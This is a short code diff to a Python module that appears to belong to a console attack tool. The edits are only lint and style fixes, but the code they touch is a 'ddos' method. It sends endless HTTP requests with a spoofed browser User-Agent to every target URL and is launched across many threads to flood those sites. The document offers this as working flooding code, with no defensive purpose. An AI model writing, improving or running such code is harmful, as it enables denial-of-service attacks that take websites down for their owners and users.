@@ -7,6 +7,7 @@ import urllib.request
 event = event()
 tools = tools()
 
+
 class Main:
 	def __init__(selfie, console):
 		global self
@@ -144,7 +145,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	def ddos(self):
 		while True:
 			for url in var.target:
-				response = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent' : "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"}))
+				response = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"}))  # noqa: F841
 				print("Request send.")
 			sleep(var.interval)
 
@@ -162,8 +163,9 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					t = Thread(target=self.ddos)
 					t.start()
 					sleep(var.sleep)
-				except:
+				except Exception:
 					print("Could not start thread %s." % thread)
+
 
 def setup(console):
 	console.ps1 = "\033[1;32;0mL3> "
